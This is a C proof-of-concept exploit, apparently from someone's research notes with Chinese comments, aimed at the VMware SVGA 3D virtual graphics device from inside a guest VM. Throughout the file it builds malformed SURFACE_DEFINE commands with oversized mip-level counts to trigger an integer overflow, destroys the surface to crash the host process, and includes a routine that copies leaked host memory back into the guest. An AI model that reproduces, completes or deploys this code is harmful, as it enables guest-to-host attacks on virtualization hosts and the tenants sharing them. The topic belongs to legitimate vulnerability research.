#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "svga.h"
#include "svga3d_reg.h"

SVGADevice gSVGA;


void SVGA3D_DefineSurface1(){
	SVGA3dCmdHeader hdr = {0}; 
	SVGA3dCmdDefineSurface surface = {0}; 
	SVGA3dSize dsize[2] = {0};
	SVGA_WriteReg(SVGA_REG_CONFIG_DONE, false);
	hdr.size = 60;
	surface.sid = 0;
	surface.surfaceFlags= SVGA3D_SURFACE_CUBEMAP;
	surface.format = SVGA3D_BUFFER;
	surface.face[0].numMipLevels = 0x2aaaaaab;
	surface.face[1].numMipLevels = 0x2aaaaaab;
	surface.face[2].numMipLevels = 0x2aaaaaab;
	surface.face[3].numMipLevels = 0x2aaaaaab;
	surface.face[4].numMipLevels = 0x2aaaaaab;
	surface.face[5].numMipLevels = 0x2aaaaaab;

	dsize[0].width  = 2;
	dsize[0].height = 2;
	dsize[0].depth  = 2;

	dsize[1].width  = 2;
	dsize[1].height = 2;
	dsize[1].depth  = 2;

	// 通过这个指令的enum, 搜索到具体的struct, 里面有传输协议的具体数据
	// 		有些是长度可变的, 有些可以嵌入其他的结构体
	VMwareWriteWordToFIFO(SVGA_3D_CMD_SURFACE_DEFINE); 
	VMwareWriteWordToFIFO(hdr.size); // 接下来需要读取的指令条数
	VMwareWriteWordToFIFO(surface.sid);
	VMwareWriteWordToFIFO(surface.surfaceFlags);
	VMwareWriteWordToFIFO(surface.format);
	VMwareWriteWordToFIFO(surface.face[0].numMipLevels);
	VMwareWriteWordToFIFO(surface.face[1].numMipLevels);
	VMwareWriteWordToFIFO(surface.face[2].numMipLevels);
	VMwareWriteWordToFIFO(surface.face[3].numMipLevels);
	VMwareWriteWordToFIFO(surface.face[4].numMipLevels);
	VMwareWriteWordToFIFO(surface.face[5].numMipLevels);

	VMwareWriteWordToFIFO(dsize[0].width);
	VMwareWriteWordToFIFO(dsize[0].height);
	VMwareWriteWordToFIFO(dsize[0].depth);
	VMwareWriteWordToFIFO(dsize[1].width);
	VMwareWriteWordToFIFO(dsize[1].height);
	VMwareWriteWordToFIFO(dsize[1].depth);

	warnx("[+] Triggering the integer overflow using SVGA_3D_CMD_SURFACE_DEFINE1...");

	VMwareWaitForFB();
}
void SVGA3D_DefineSurface2(){
	SVGA3dCmdHeader hdr = {0};
	SVGA3dCmdDefineSurface surface = {0};
	SVGA3dSize dsize[2] = {0};
	SVGA_WriteReg(SVGA_REG_CONFIG_DONE, false);
	hdr.size = 48;
	surface.sid = 0;
	surface.surfaceFlags = SVGA3D_SURFACE_HINT_STATIC;
	surface.format = SVGA3D_BUFFER;
	surface.face[0].numMipLevels = 1;
	surface.face[1].numMipLevels = 0;
	surface.face[2].numMipLevels = 0;
	surface.face[3].numMipLevels = 0;
	surface.face[4].numMipLevels = 0;
	surface.face[5].numMipLevels = 0;

	dsize[0].width  = 0x1;
	dsize[0].height = 0x2aaaaaab;
	dsize[0].depth  = 0x6;

	VMwareWriteWordToFIFO(SVGA_3D_CMD_SURFACE_DEFINE); 
	VMwareWriteWordToFIFO(hdr.size);
	VMwareWriteWordToFIFO(surface.sid);
	VMwareWriteWordToFIFO(surface.surfaceFlags);
	VMwareWriteWordToFIFO(surface.format);
	VMwareWriteWordToFIFO(surface.face[0].numMipLevels);
	VMwareWriteWordToFIFO(surface.face[1].numMipLevels);
	VMwareWriteWordToFIFO(surface.face[2].numMipLevels);
	VMwareWriteWordToFIFO(surface.face[3].numMipLevels);
	VMwareWriteWordToFIFO(surface.face[4].numMipLevels);
	VMwareWriteWordToFIFO(surface.face[5].numMipLevels);
	VMwareWriteWordToFIFO(dsize[0].width);
	VMwareWriteWordToFIFO(dsize[0].height);
	VMwareWriteWordToFIFO(dsize[0].depth);
	VMwareWaitForFB();
	warnx("[+] Triggering the integer overflow using SVGA_3D_CMD_SURFACE_DEFINE2...");
}

void SVGA3D_DestroySurface1(){
	SVGA3dCmdHeader hdr = {0}; 
	SVGA3dCmdDestroySurface destroy_sid = {0};
	SVGA_WriteReg(SVGA_REG_CONFIG_DONE, false); // 这个false是不是可以理解为开始读取指令
	hdr.size = 4;
	destroy_sid.sid = 0;
	VMwareWriteWordToFIFO(SVGA_3D_CMD_SURFACE_DESTROY); 
	VMwareWriteWordToFIFO(hdr.size);
	VMwareWriteWordToFIFO(destroy_sid.sid);
	warnx("[+] Triggering the crash using SVGA_3D_CMD_SURFACE_DESTROY...");
	VMwareWaitForFB();
}




void
allocate_surface(uint32_t sid, uint32_t size)
{       
	SVGA3dCmdHeader hdr = {0};
	SVGA3dCmdDefineSurface surface = {0};
	SVGA3dSize dsize[2] = {0};

	hdr.size = 48;

	surface.sid = sid;
	surface.surfaceFlags = SVGA3D_SURFACE_HINT_STATIC;
	surface.format = SVGA3D_BUFFER;
	surface.face[0].numMipLevels = 1;
	surface.face[1].numMipLevels = 0;
	surface.face[2].numMipLevels = 0;
	surface.face[3].numMipLevels = 0;
	surface.face[4].numMipLevels = 0;
	surface.face[5].numMipLevels = 0;

	/* Keep cbSurfacePitch in multiples of 8 */       
	if ( (size/2) % 8 != 0) die("Assertion");

	dsize[0].width  = size/2;	// to make up for depth = 2
	dsize[0].height = 1;
	dsize[0].depth  = 2;

	SVGA_WriteReg(SVGA_REG_CONFIG_DONE, false);

	VMwareWriteWordToFIFO(SVGA_3D_CMD_SURFACE_DEFINE);
	VMwareWriteWordToFIFO(hdr.size);
	VMwareWriteWordToFIFO(surface.sid);
	VMwareWriteWordToFIFO(surface.surfaceFlags);
	VMwareWriteWordToFIFO(surface.format);
	VMwareWriteWordToFIFO(surface.face[0].numMipLevels);
	VMwareWriteWordToFIFO(surface.face[1].numMipLevels);
	VMwareWriteWordToFIFO(surface.face[2].numMipLevels);
	VMwareWriteWordToFIFO(surface.face[3].numMipLevels);
	VMwareWriteWordToFIFO(surface.face[4].numMipLevels);
	VMwareWriteWordToFIFO(surface.face[5].numMipLevels);
	VMwareWriteWordToFIFO(dsize[0].width);
	VMwareWriteWordToFIFO(dsize[0].height);
	VMwareWriteWordToFIFO(dsize[0].depth);
	VMwareWaitForFB();

}

void
copy_surface(uint32_t sid, SVGA3dTransferType type, uint8_t *memory, uint32_t size)
{
	SVGA3dCmdHeader hdr = {0};
	SVGA3dCmdSurfaceDMA surfacedma = {0};
	SVGA3dCopyBox boxes = {0};

	hdr.size = 64;

	surfacedma.guest.ptr.gmrId  = SVGA_GMR_FRAMEBUFFER;
	surfacedma.guest.ptr.offset = 0;
	surfacedma.guest.pitch      = 0;
	surfacedma.host.sid         = sid;
	surfacedma.host.face        = 0;
	surfacedma.host.mipmap      = 0;
	surfacedma.transfer         = type;

	boxes.x = 0;
	boxes.y = 0;
	boxes.z = 0;
	boxes.w = size;			// used for cbWidth
	boxes.h = 1;
	boxes.d = 1;			// used for cHeight
	boxes.srcx = 0;
	boxes.srcy = 0;
	boxes.srcz = 0;

	SVGA_WriteReg(SVGA_REG_CONFIG_DONE, false);

	VMwareWriteWordToFIFO(SVGA_3D_CMD_SURFACE_DMA);
	VMwareWriteWordToFIFO(hdr.size);
	VMwareWriteWordToFIFO(surfacedma.guest.ptr.gmrId);
	VMwareWriteWordToFIFO(surfacedma.guest.ptr.offset);
	VMwareWriteWordToFIFO(surfacedma.guest.pitch);
	VMwareWriteWordToFIFO(surfacedma.host.sid);
	VMwareWriteWordToFIFO(surfacedma.host.face);
	VMwareWriteWordToFIFO(surfacedma.host.mipmap);
	VMwareWriteWordToFIFO(surfacedma.transfer);
	VMwareWriteWordToFIFO(boxes.x);
	VMwareWriteWordToFIFO(boxes.y);
	VMwareWriteWordToFIFO(boxes.z);
	VMwareWriteWordToFIFO(boxes.w);
	VMwareWriteWordToFIFO(boxes.h);
	VMwareWriteWordToFIFO(boxes.d);
	VMwareWriteWordToFIFO(boxes.srcx);
	VMwareWriteWordToFIFO(boxes.srcy);
	VMwareWriteWordToFIFO(boxes.srcz);

	/* copy data to framebuffer for writing to surface */
	if (type == SVGA3D_WRITE_HOST_VRAM) {
		memcpy(gSVGA.fbMem, memory, size);
	}

	VMwareWaitForFB();

	/* copy leaked data from framebuffer  */
	if (type == SVGA3D_READ_HOST_VRAM) {
		memcpy(memory, gSVGA.fbMem, size);
	}
}


int main(int argc, char **argv)
{
	if (conf_svga_device() != 0)
		errx(EXIT_FAILURE, "[!] Error initializing SVGA device");

	SVGA3dRect rect;
	rect.x = 0;
	rect.y = 0;
	rect.w = 0x320;
	rect.h = 0x258;

	SVGA_WriteReg(SVGA_REG_WIDTH, 0x320);
	SVGA_WriteReg(SVGA_REG_HEIGHT, 0x258);
	SVGA_WriteReg(SVGA_REG_BITS_PER_PIXEL, 32); //这三个不确定删去之后有啥作用

	// 看起来在这里才完成初始化??? 接下来才是正题?
	uint32_t cap = SVGA_ReadReg(SVGA_REG_CAPABILITIES);
	log("cap = 0x%x\n", cap); // poc.c:29:main(): cap = 0xfdff83e2, 0xfdffc3e2
	// 除了 SVGA_CAP_3D 其他权限都有了

	SVGA3D_DefineContext(0);
	SVGA3D_BeginClear(0, SVGA3D_CLEAR_COLOR | SVGA3D_CLEAR_DEPTH,
                     0xFFFFFFFF, 1.0f, 0, &rect, 1);


/* TODO: 
1. Check 如何有3D权限
	在VMware中, 无论是否有图形界面, 都是存在3D特权的
	在Esxi中, 这个是嵌入到VMware的Esxi, 是没有3D特权的(其他特权都有)
		1. 猜测Esxi需要直接安装在物理机
		2. 猜测需要启动3D加速之类的功能?
	自己手动开启3D加速即可, vmw可能是默认打开的

2. 从SVGA的协议和命令, 如何到新建对象, 解析Shader
	这个可以先参考那个典型的文章

3. Shader如何生成, 从ASM到最后传入的bytecode, 或者是如何直接从fx源代码生成我们所需要的bytecode对象
	这个部分的示例可以参考 svga-sdk
*/

	log("FIFO Cap = %X\n",SVGA_GetFIFOCap());

	u8 * buf = malloc (0x1000);
	memset (buf , 0xCC, 0x1000);
	allocate_surface(0, 0x1000 );
	copy_surface(0,SVGA3D_WRITE_HOST_VRAM, buf, 0x1000 );

	SVGA3D_DefineSurface1();
	SVGA3D_DefineSurface2();
	SVGA3D_DestroySurface1();
	
	return 0;
}
